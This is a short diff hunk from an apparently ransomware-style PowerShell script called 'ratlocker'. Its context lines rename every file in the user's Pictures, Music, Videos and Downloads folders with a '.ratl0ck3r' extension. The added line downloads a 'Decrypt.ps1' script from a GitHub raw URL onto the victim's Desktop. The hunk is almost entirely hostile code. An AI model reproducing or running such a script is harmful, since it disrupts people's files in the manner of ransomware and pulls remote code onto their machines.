@@ -20,3 +20,4 @@ dir $HOME\Pictures\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
 dir $HOME\Music\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
 dir $HOME\Videos\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
 dir $HOME\Downloads\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/Decrypt.ps1 -OutFile $HOME\Desktop\Decryption.ps1
